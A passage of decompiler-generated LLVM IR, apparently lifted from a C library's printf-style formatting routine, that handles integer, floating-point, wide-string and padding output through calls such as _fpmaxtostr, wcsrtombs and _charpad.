  %v4_10624 = load i32, i32* %v3_10624, align 4
  %v2_1062c = and i32 %v4_10624, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_10608, %.thread15
  %storemerge93 = phi i32 [ %v2_1062c, %.thread15 ], [ 1024, %dec_label_pc_10608 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_1063080, i32* @r2, align 4
  %v3_10634 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_10634, i32* @r1, align 4
  %v0_10638 = call i32 @_load_inttype()
  store i32 %v0_10638, i32* @r2, align 4
  %v0_10644 = load i32, i32* @r1, align 4
  store i32 %v0_10644, i32* @r3, align 4
  store i32 %v2_10648, i32* %r0.global-to-local, align 4
  %v2_10650 = call i32 @_uintmaxtostr(i8* %v1_10650)
  store i32 %v2_10650, i32* %r0.global-to-local, align 4
  store i32 %v2_10650, i32* @r4, align 4
  br i1 %v3_10660, label %bb160, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %bb157
  %v3_10650 = inttoptr i32 %v2_10650 to i8*
  %v3_10664 = load i8, i8* %v3_10650, align 1
  %v7_10668 = icmp eq i8 %v3_10664, 45
  %v2_10670 = or i32 %v0_105d8, 2
  %v2_10670.stack_var_-336.0 = select i1 %v7_10668, i32 %v2_10670, i32 %v0_105d8
  br i1 %v7_10668, label %.thread17, label %dec_label_pc_10684

.thread17:                                        ; preds = %dec_label_pc_10664
  %v3_10674 = add i32 %v2_10650, 1
  store i32 %v3_10674, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_10684:                               ; preds = %dec_label_pc_10664
  %v1_10684 = and i32 %v2_10670.stack_var_-336.0, 2
  %v2_10684 = icmp eq i32 %v1_10684, 0
  br i1 %v2_10684, label %dec_label_pc_10690, label %bb158

bb158:                                            ; preds = %dec_label_pc_10684
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_10690:                               ; preds = %dec_label_pc_10684
  %v1_10690 = urem i32 %v2_10670.stack_var_-336.0, 2
  %v2_10690 = icmp eq i32 %v1_10690, 0
  br i1 %v2_10690, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_10690
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_10690, %bb159
  %v0_106ec = phi i32 [ %v2_10650, %bb157 ], [ %v3_10674, %.thread17 ], [ %v2_10650, %dec_label_pc_10690 ], [ %v2_10650, %bb159 ], [ %v2_10650, %bb158 ]
  %v0_106a8 = phi i32 [ %v0_105d8, %bb157 ], [ %v2_10670, %.thread17 ], [ %v0_105d8, %dec_label_pc_10690 ], [ %v0_105d8, %bb159 ], [ %v0_105d8, %bb158 ]
  %v3_10698 = load i32, i32* %stack_var_-348, align 4
  %v1_106a0 = icmp slt i32 %v3_10698, 0
  br i1 %v1_106a0, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_10698, %bb160 ]
  %v0_106d0 = phi i32 [ 1, %bb161 ], [ %v3_10698, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_106a8 = and i32 %v0_106a8, 16
  %v2_106a8 = icmp eq i32 %v1_106a8, 0
  %v2_106b4 = sub i32 %v2_10648, %v0_106ec
  store i32 %v2_106b4, i32* @r5, align 4
  br i1 %v2_106a8, label %bb169, label %dec_label_pc_106bc

dec_label_pc_106bc:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_106bc
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_106bc, %bb163
  br i1 %v7_106c8, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_106d0, %v2_106b4
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_106d4, label %dec_label_pc_106dc, label %bb169

dec_label_pc_106dc:                               ; preds = %bb167
  %v1_106dc = inttoptr i32 %v0_106ec to i8*
  %v2_106dc = load i8, i8* %v1_106dc, align 1
  %v7_106e0 = icmp eq i8 %v2_106dc, 48
  br i1 %v7_106e0, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_106dc
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_106dc
  %v2_106e8 = add i32 %v2_106b4, 1
  store i32 %v2_106e8, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_1072c = phi i32 [ %v0_106d0, %bb167 ], [ %v0_106d0, %bb162 ], [ 1, %bb168 ], [ %v2_106e8, %.thread24 ], [ %v0_106d0, %bb166 ]
  %v1_106ec = inttoptr i32 %v0_106ec to i8*
  %v2_106ec = load i8, i8* %v1_106ec, align 1
  %v7_106f0 = icmp eq i8 %v2_106ec, 48
  br i1 %v7_106f0, label %dec_label_pc_106f8, label %dec_label_pc_10728

dec_label_pc_106f8:                               ; preds = %bb169
  %v0_106fc = load i32, i32* @r6, align 4
  %v7_10700 = icmp slt i32 %v0_106fc, 6
  br i1 %v7_10700, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_106f8
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_106f8, %bb170
  br i1 %v7_10618, label %.thread27, label %dec_label_pc_1071c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -37060), i32* @r4, align 4
  br label %dec_label_pc_10734

dec_label_pc_1071c:                               ; preds = %bb171
  %v2_1071c = icmp eq i32 %v5_1072c, 0
  br i1 %v2_1071c, label %bb172, label %dec_label_pc_10728

bb172:                                            ; preds = %dec_label_pc_1071c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10734

dec_label_pc_10728:                               ; preds = %dec_label_pc_1071c, %bb169
  %v2_10728 = sub i32 %v5_1072c, %v2_106b4
  %tmp211 = icmp ugt i32 %v5_1072c, %v2_106b4
  br i1 %tmp211, label %.thread85, label %dec_label_pc_10734

.thread85:                                        ; preds = %dec_label_pc_10728
  store i32 %v2_10728, i32* @r8, align 4
  br label %dec_label_pc_10940thread-pre-split

dec_label_pc_10734:                               ; preds = %dec_label_pc_10728, %.thread27, %bb172
  %v1_10944.pre205 = phi i32 [ %v2_106b4, %dec_label_pc_10728 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10940thread-pre-split

dec_label_pc_1073c:                               ; preds = %dec_label_pc_105a0
  br i1 %tmp208, label %dec_label_pc_1077c, label %dec_label_pc_10744

dec_label_pc_10744:                               ; preds = %dec_label_pc_1073c
  %v3_10754 = load i32, i32* %stack_var_-72, align 4
  %v0_10758 = load i32, i32* @fp, align 4
  store i32 %v0_10758, i32* %r0.global-to-local, align 4
  %v1_1075c = inttoptr i32 %v3_10754 to i32*
  %v2_1075c = load i32, i32* %v1_1075c, align 4
  store i32 %v2_1075c, i32* %r2.global-to-local, align 4
  %v3_1075c = add i32 %v3_10754, 4
  %v4_1075c = inttoptr i32 %v3_1075c to i32*
  %v5_1075c = load i32, i32* %v4_1075c, align 4
  %v8_10760 = call i32 @_fpmaxtostr(i32 %v0_10758, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -91504) to i64) to double), i32 %v2_1075c, i32 %v5_1075c, i32 %v2_108f0, i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -91504))
  store i32 %v8_10760, i32* %r0.global-to-local, align 4
  %v1_10764 = icmp slt i32 %v8_10760, 0
  br i1 %v1_10764, label %dec_label_pc_10a98, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10744
  %v2_10770 = add i32 %v8_10760, %v1_10970
  store i32 %v2_10770, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10a84

dec_label_pc_1077c:                               ; preds = %dec_label_pc_1073c
  br i1 %v3_10780, label %dec_label_pc_10804, label %dec_label_pc_10784

dec_label_pc_10784:                               ; preds = %dec_label_pc_1077c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_1078c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1078c, i32* %r0.global-to-local, align 4
  br i1 %v7_1077c, label %dec_label_pc_10794, label %dec_label_pc_107cc

dec_label_pc_10794:                               ; preds = %dec_label_pc_10784
  %v1_10794 = inttoptr i32 %v3_1078c to i32*
  %v2_10794 = load i32, i32* %v1_10794, align 4
  %v9_10798 = icmp eq i32 %v2_10794, 0
  store i32 %v2_10794, i32* %stack_var_-44, align 4
  br i1 %v9_10798, label %dec_label_pc_10844, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %dec_label_pc_10794
  %v3_107a4 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_107a8, i32* @r0, align 4
  %v4_107ac = ashr i32 %v3_107a4, 31
  %v5_107ac = or i32 %v4_107ac, %v3_107a4
  store i32 %v5_107ac, i32* %r2.global-to-local, align 4
  store i32 %v2_107a8, i32* @r1, align 4
  %v6_107b8 = call i32 @__GI_wcsrtombs(i32 %v2_107a8, i32 %v2_107a8, i32 %v5_107ac, i32 %v2_107b4, i32 0, i32 %v2_10794)
  store i32 %v6_107b8, i32* %r0.global-to-local, align 4
  %v3_107bc = icmp eq i32 %v6_107b8, -1
  store i32 %v6_107b8, i32* @r5, align 4
  br i1 %v3_107bc, label %dec_label_pc_10a98, label %dec_label_pc_10930

dec_label_pc_107cc:                               ; preds = %dec_label_pc_10784
  store i32 %v2_108ac, i32* %r7.global-to-local, align 4
  %v1_107d0 = inttoptr i32 %v3_1078c to i32*
  %v2_107d0 = load i32, i32* %v1_107d0, align 4
  store i32 %v2_107b4, i32* %r2.global-to-local, align 4
  store i32 %v2_108ac, i32* %r0.global-to-local, align 4
  %v5_107dc = call i32 @__GI_wcrtomb(i32 %v2_108ac, i32 %v2_107d0, i32 %v2_107b4, i32 %tmp105, i32 0)
  store i32 %v5_107dc, i32* %r0.global-to-local, align 4
  %v7_107e0 = icmp eq i32 %v5_107dc, -1
  store i32 %v5_107dc, i32* @r5, align 4
  br i1 %v7_107e0, label %dec_label_pc_10a98, label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %dec_label_pc_107cc
  %v0_107ec = load i32, i32* @sl, align 4
  store i32 %v0_107ec, i32* @r8, align 4
  store i32 %v2_108ac, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_107fc = trunc i32 %v0_107ec to i8
  %v2_107fc = load i32, i32* %r7.global-to-local, align 4
  %v4_107fc = add i32 %v2_107fc, %v5_107dc
  %v5_107fc = inttoptr i32 %v4_107fc to i8*
  store i8 %v1_107fc, i8* %v5_107fc, align 1
  %v0_10944.pre.pre = load i32, i32* @r8, align 4
  %v1_10944.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10940thread-pre-split

dec_label_pc_10804:                               ; preds = %dec_label_pc_1077c
  br i1 %v3_10808, label %dec_label_pc_108a0, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_10804
  %v3_1080c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1080c, i32* %r0.global-to-local, align 4
  %v1_10814 = inttoptr i32 %v3_1080c to i32*
  %v2_10814 = load i32, i32* %v1_10814, align 4
  br i1 %v7_10804, label %dec_label_pc_10814, label %dec_label_pc_10878

dec_label_pc_10814:                               ; preds = %dec_label_pc_1080c
  store i32 %v2_10814, i32* @r4, align 4
  %v2_10818 = icmp eq i32 %v2_10814, 0
  br i1 %v2_10818, label %dec_label_pc_10844, label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_10814, %dec_label_pc_108a8
  %v0_10824 = phi i32 [ %v2_10814, %dec_label_pc_10814 ], [ %v3_108b8, %dec_label_pc_108a8 ]
  %v3_10820 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_10824, i32* %r0.global-to-local, align 4
  %v4_10828 = ashr i32 %v3_10820, 31
  %v5_10828 = or i32 %v4_10828, %v3_10820
  %v2_1082c = inttoptr i32 %v0_10824 to i8*
  %v3_1082c = call i32 @strnlen(i8* %v2_1082c, i32 %v5_10828)
  store i32 %v3_1082c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_1082c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10940

dec_label_pc_10844:                               ; preds = %dec_label_pc_10814, %dec_label_pc_10794
  %v3_10844 = load i32, i32* %stack_var_-348, align 4
  %v1_10848 = icmp slt i32 %v3_10844, 0
  br i1 %v1_10848, label %dec_label_pc_10860, label %dec_label_pc_10850

dec_label_pc_10850:                               ; preds = %dec_label_pc_10844
  %tmp212 = icmp ult i32 %v3_10844, 6
  br i1 %tmp212, label %dec_label_pc_10868, label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_10850, %dec_label_pc_10844
  br label %dec_label_pc_10868

dec_label_pc_10868:                               ; preds = %dec_label_pc_10850, %dec_label_pc_10860
  %storemerge97 = phi i32 [ 6, %dec_label_pc_10860 ], [ 0, %dec_label_pc_10850 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -37052), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10940

dec_label_pc_10878:                               ; preds = %dec_label_pc_1080c
  store i32 %v2_10814, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_108ac, i32* @r4, align 4
  store i32 %v2_10814, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10940thread-pre-split

dec_label_pc_108a0:                               ; preds = %dec_label_pc_10804
  br i1 %v7_108a0, label %dec_label_pc_108a8, label %dec_label_pc_108c4

dec_label_pc_108a8:                               ; preds = %dec_label_pc_108a0
  %v0_108a8 = call i32 @__GI___errno_location()
  store i32 %v0_108a8, i32* %r0.global-to-local, align 4
  %v1_108b0 = inttoptr i32 %v0_108a8 to i32*
  %v2_108b0 = load i32, i32* %v1_108b0, align 4
  store i32 %v2_108b0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_108b8 = call i32 @__GI___glibc_strerror_r(i32 %v2_108b0, i32 %v2_108ac, i32 128)
  store i32 %v3_108b8, i32* %r0.global-to-local, align 4
  store i32 %v3_108b8, i32* @r4, align 4
  br label %dec_label_pc_10820

dec_label_pc_108c4:                               ; preds = %dec_label_pc_108a0
  %v4_108cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3856) to i32*), align 4
  %v1_108d4 = add i32 %v4_108cc, 10
  store i32 %v1_108d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_10920, %dec_label_pc_108c4
  %v1_108e8 = phi i32 [ %v1_10920, %dec_label_pc_10920 ], [ %v4_108cc, %dec_label_pc_108c4 ]
  %v1_108d8 = inttoptr i32 %v1_108e8 to i8*
  %v2_108d8 = load i8, i8* %v1_108d8, align 1
  %v3_108d8 = zext i8 %v2_108d8 to i32
  store i32 %v3_108d8, i32* %r2.global-to-local, align 4
  %v9_108e0 = icmp eq i32 %v3_108d8, %tmp99
  br i1 %v9_108e0, label %dec_label_pc_108e8, label %dec_label_pc_10920

dec_label_pc_108e8:                               ; preds = %dec_label_pc_108d8
  %v2_108e8 = sub i32 %v1_108e8, %v4_108cc
  %v0_108ec = load i32, i32* @fp, align 4
  store i32 %v0_108ec, i32* %r0.global-to-local, align 4
  store i32 %v2_108f4, i32* %r2.global-to-local, align 4
  %v4_108fc = mul i32 %v2_108e8, 4
  %v5_108fc = add i32 %v4_108fc, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29408)
  %v6_108fc = inttoptr i32 %v5_108fc to i32*
  %v7_108fc = load i32, i32* %v6_108fc, align 4
  store i32 %v7_108fc, i32* @ip, align 4
  store i32 67848, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_108fc)
  %v0_10908 = load i32, i32* %r0.global-to-local, align 4
  %v1_10908 = icmp slt i32 %v0_10908, 0
  br i1 %v1_10908, label %dec_label_pc_10a98, label %dec_label_pc_10910

dec_label_pc_10910:                               ; preds = %dec_label_pc_108e8
  %v2_10914 = add i32 %v0_10908, %v1_10970
  br label %dec_label_pc_10a84

dec_label_pc_10920:                               ; preds = %dec_label_pc_108d8
  %v1_10920 = add i32 %v1_108e8, 1
  %v3_10924 = icmp ult i32 %v1_10920, %v1_108d4
  br i1 %v3_10924, label %dec_label_pc_108d8, label %dec_label_pc_10a98

dec_label_pc_10930:                               ; preds = %dec_label_pc_107a4
  %v0_10930 = load i32, i32* @sl, align 4
  store i32 %v0_10930, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10930, i32* @r4, align 4
  br label %dec_label_pc_10940

dec_label_pc_10940thread-pre-split:               ; preds = %.thread85, %dec_label_pc_10734, %dec_label_pc_107ec, %dec_label_pc_10878
  %v1_10944.pre = phi i32 [ %v1_10944.pre205, %dec_label_pc_10734 ], [ %v1_10944.pre.pre, %dec_label_pc_107ec ], [ 1, %dec_label_pc_10878 ], [ %v2_106b4, %.thread85 ]
  %v0_10944.pre = phi i32 [ 0, %dec_label_pc_10734 ], [ %v0_10944.pre.pre, %dec_label_pc_107ec ], [ 0, %dec_label_pc_10878 ], [ %v2_10728, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_106a8, %dec_label_pc_10734 ], [ %v0_105d8, %dec_label_pc_107ec ], [ %v0_105d8, %dec_label_pc_10878 ], [ %v0_106a8, %.thread85 ]
  %v0_10940.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_10940

dec_label_pc_10940:                               ; preds = %dec_label_pc_10940thread-pre-split, %dec_label_pc_10868, %dec_label_pc_10820, %dec_label_pc_10930
  %v1_10944 = phi i32 [ %v1_10944.pre, %dec_label_pc_10940thread-pre-split ], [ %storemerge97, %dec_label_pc_10868 ], [ %v3_1082c, %dec_label_pc_10820 ], [ %v6_107b8, %dec_label_pc_10930 ]
  %v0_10944 = phi i32 [ %v0_10944.pre, %dec_label_pc_10940thread-pre-split ], [ 0, %dec_label_pc_10868 ], [ 0, %dec_label_pc_10820 ], [ %v0_10930, %dec_label_pc_10930 ]
  %v0_1094c = phi i32 [ %v0_10940.pr, %dec_label_pc_10940thread-pre-split ], [ 11, %dec_label_pc_10868 ], [ 11, %dec_label_pc_10820 ], [ 11, %dec_label_pc_10930 ]
  %v0_1098c = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_10940thread-pre-split ], [ %v0_105d8, %dec_label_pc_10868 ], [ %v0_105d8, %dec_label_pc_10820 ], [ %v0_105d8, %dec_label_pc_10930 ]
  %v7_10940 = icmp eq i32 %v0_1094c, 11
  %v2_10944 = add i32 %v1_10944, %v0_10944
  br i1 %v7_10940, label %dec_label_pc_1095c, label %bb173

bb173:                                            ; preds = %dec_label_pc_10940
  %v7_10954 = icmp sgt i32 %v0_1094c, 5
  %. = select i1 %v7_10954, i32 2, i32 1
  %v2_10958 = add i32 %v2_10944, %.
  br label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_10940, %bb173
  %v0_10970 = phi i32 [ %v2_10944, %dec_label_pc_10940 ], [ %v2_10958, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_10960 = icmp uge i32 %tmp98, %v0_10970
  %v9_10960 = icmp eq i32 %tmp98, %v0_10970
  %v2_10964 = xor i1 %v9_10960, true
  %v3_10964 = and i1 %v3_10960, %v2_10964
  br i1 %v3_10964, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_1095c
  %v2_10960 = sub i32 %tmp98, %v0_10970
  store i32 %v2_10960, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_1095c, %bb174
  store i32 %v1_10970, i32* %r2.global-to-local, align 4
  %v2_1096c = xor i1 %v3_10960, true
  %v3_1096c = or i1 %v9_10960, %v2_1096c
  br i1 %v3_1096c, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_10974.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_10984 = phi i32 [ %v1_10974.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_10970 = add i32 %v0_10970, %v1_10970
  %v2_10974 = add i32 %v2_10970, %v2_10984
  %v0_10980 = load i32, i32* @sb, align 4
  %v7_10980 = icmp eq i32 %v0_10980, 48
  br i1 %v7_10980, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_10984 = add i32 %v2_10984, %v0_10944
  store i32 %v3_10984, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_1099c = phi i32 [ %v2_10984, %bb177 ], [ 0, %bb178 ]
  %v1_1098c = and i32 %v0_1098c, 8
  store i32 %v1_1098c, i32* @r7, align 4
  %v2_1098c = icmp eq i32 %v1_1098c, 0
  br i1 %v2_1098c, label %dec_label_pc_10994, label %dec_label_pc_109b0

dec_label_pc_10994:                               ; preds = %.thread30
  %v0_10994 = load i32, i32* @fp, align 4
  store i32 %v0_10994, i32* %r0.global-to-local, align 4
  store i32 %v0_1099c, i32* %r2.global-to-local, align 4
  %v4_109a0 = call i32 @_charpad(i32 %v0_10994, i8 32, i32 %v0_1099c)
  store i32 %v4_109a0, i32* %r0.global-to-local, align 4
  %v1_109a4 = load i32, i32* @sl, align 4
  %v9_109a4 = icmp eq i32 %v4_109a0, %v1_109a4
  br i1 %v9_109a4, label %dec_label_pc_109ac, label %dec_label_pc_10a98

dec_label_pc_109ac:                               ; preds = %dec_label_pc_10994
  %v0_109ac = load i32, i32* @r7, align 4
  store i32 %v0_109ac, i32* @sl, align 4
  %v0_109b8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %.thread30, %dec_label_pc_109ac
  %v0_109b8 = phi i32 [ %v0_1094c, %.thread30 ], [ %v0_109b8.pre, %dec_label_pc_109ac ]
  %v0_109b4 = load i32, i32* @fp, align 4
  %v2_109b8 = add i32 %v0_109b8, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -37044)
  store i32 %v2_109b8, i32* %r0.global-to-local, align 4
  %v2_109bc = inttoptr i32 %v2_109b8 to i8*
  %v3_109bc = call i32 @__GI_fputs_unlocked(i8* %v2_109bc, i32 %v0_109b4)
  %v0_109c0 = load i32, i32* @fp, align 4
  store i32 %v0_109c0, i32* %r0.global-to-local, align 4
  %v0_109c8 = load i32, i32* @r8, align 4
  store i32 %v0_109c8, i32* %r2.global-to-local, align 4
  %v4_109cc = call i32 @_charpad(i32 %v0_109c0, i8 48, i32 %v0_109c8)
  store i32 %v4_109cc, i32* %r0.global-to-local, align 4
  %v1_109d0 = load i32, i32* @r8, align 4
  %v9_109d0 = icmp eq i32 %v4_109cc, %v1_109d0
  br i1 %v9_109d0, label %dec_label_pc_109d8, label %dec_label_pc_10a98

dec_label_pc_109d8:                               ; preds = %dec_label_pc_109b0
  %v3_109d8 = load i32, i32* %stack_var_-44, align 4
  %v2_109dc = icmp eq i32 %v3_109d8, 0
  br i1 %v2_109dc, label %dec_label_pc_109e4, label %dec_label_pc_10a08

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109d8
  %v0_109e4 = load i32, i32* @r5, align 4
  %v2_109e4 = icmp eq i32 %v0_109e4, 0
  br i1 %v2_109e4, label %dec_label_pc_10a6c, label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  %v0_109ec = load i32, i32* @r4, align 4
  store i32 %v0_109ec, i32* %r0.global-to-local, align 4
  %v0_109f4 = load i32, i32* @fp, align 4
  store i32 %v0_109f4, i32* %r2.global-to-local, align 4
  %v3_109f8 = inttoptr i32 %v0_109f4 to i16*
  %v4_109f8 = call i32 @__stdio_fwrite(i32 %v0_109ec, i32 %v0_109e4, i16* %v3_109f8)
  store i32 %v4_109f8, i32* %r0.global-to-local, align 4
  %v1_109fc = load i32, i32* @r5, align 4
  %v9_109fc = icmp eq i32 %v4_109f8, %v1_109fc
  br i1 %v9_109fc, label %dec_label_pc_10a6c, label %dec_label_pc_10a98

dec_label_pc_10a08:                               ; preds = %dec_label_pc_109d8
  store i32 %v2_108ac, i32* @r6, align 4
  store i32 %v2_107a8, i32* @r8, align 4
  store i32 %v2_107b4, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10a58.pr = load i32, i32* @r5, align 4
  %v2_10a5841 = icmp eq i32 %v0_10a58.pr, 0
  store i32 %v2_107a8, i32* @r1, align 4
  store i32 %v2_108ac, i32* @r0, align 4
  br i1 %v2_10a5841, label %dec_label_pc_10a6c, label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_10a54
  %v1_10a24 = phi i32 [ %v2_10a54, %dec_label_pc_10a54 ], [ %v0_10a58.pr, %dec_label_pc_10a08 ]
  %v2_10a20 = icmp ult i32 %v1_10a24, 128
  %.v1_10a24 = select i1 %v2_10a20, i32 %v1_10a24, i32 128
  store i32 %.v1_10a24, i32* %r2.global-to-local, align 4
  %v6_10a2c = call i32 @__GI_wcsrtombs(i32 %v2_108ac, i32 %v2_107a8, i32 %.v1_10a24, i32 %v2_107b4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_10a2c, i32* @r4, align 4
  %v2_10a30 = icmp eq i32 %v6_10a2c, 0
  store i32 %v6_10a2c, i32* %r0.global-to-local, align 4
  br i1 %v2_10a30, label %dec_label_pc_10a54, label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_10a20
  store i32 %v2_108ac, i32* %r0.global-to-local, align 4
  %v0_10a44 = load i32, i32* @fp, align 4
  store i32 %v0_10a44, i32* %r2.global-to-local, align 4
  %v3_10a48 = inttoptr i32 %v0_10a44 to i16*
  %v4_10a48 = call i32 @__stdio_fwrite(i32 %v2_108ac, i32 %v6_10a2c, i16* %v3_10a48)
  store i32 %v4_10a48, i32* %r0.global-to-local, align 4
  %v1_10a4c = load i32, i32* @r4, align 4
  %v9_10a4c = icmp eq i32 %v4_10a48, %v1_10a4c
  br i1 %v9_10a4c, label %dec_label_pc_10a54, label %dec_label_pc_10a98

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a3c, %dec_label_pc_10a20
  %v0_10a54 = phi i32 [ %v4_10a48, %dec_label_pc_10a3c ], [ 0, %dec_label_pc_10a20 ]
  %v1_10a54 = load i32, i32* @r5, align 4
  %v2_10a54 = sub i32 %v1_10a54, %v0_10a54
  store i32 %v2_10a54, i32* @r5, align 4
  %v2_10a58 = icmp eq i32 %v2_10a54, 0
  store i32 %v2_107a8, i32* @r1, align 4
  store i32 %v2_108ac, i32* @r0, align 4
  br i1 %v2_10a58, label %dec_label_pc_10a6c, label %dec_label_pc_10a20

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a54, %dec_label_pc_10a08, %dec_label_pc_109ec, %dec_label_pc_109e4
  %v0_10a6c = load i32, i32* @fp, align 4
  store i32 %v0_10a6c, i32* %r0.global-to-local, align 4
  %v0_10a74 = load i32, i32* @sl, align 4
  store i32 %v0_10a74, i32* %r2.global-to-local, align 4
  %v4_10a78 = call i32 @_charpad(i32 %v0_10a6c, i8 32, i32 %v0_10a74)
  store i32 %v4_10a78, i32* %r0.global-to-local, align 4
  %v1_10a7c = load i32, i32* @sl, align 4
  %v9_10a7c = icmp eq i32 %v4_10a78, %v1_10a7c
  br i1 %v9_10a7c, label %dec_label_pc_10a84, label %dec_label_pc_10a98

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a6c, %dec_label_pc_10910, %dec_label_pc_1076c, %dec_label_pc_1057c
  %stack_var_-336.4 = phi i32 [ %v0_105d8, %dec_label_pc_1057c ], [ %v0_1098c, %dec_label_pc_10a6c ], [ %v0_105d8, %dec_label_pc_10910 ], [ %v0_105d8, %dec_label_pc_1076c ]
  %stack_var_-356.3 = phi i32 [ %v1_10970, %dec_label_pc_1057c ], [ %v2_10974, %dec_label_pc_10a6c ], [ %v2_10914, %dec_label_pc_10910 ], [ %v2_10770, %dec_label_pc_1076c ]
  %v3_10a84 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_10a84, i32* @r4, align 4
  store i32 %v3_10a84, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_104a4.outer

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10500
  %v1_10a90 = add i32 %v0_10508, 2
  store i32 %v1_10a90, i32* @r4, align 4
  br label %dec_label_pc_104a4.outer36

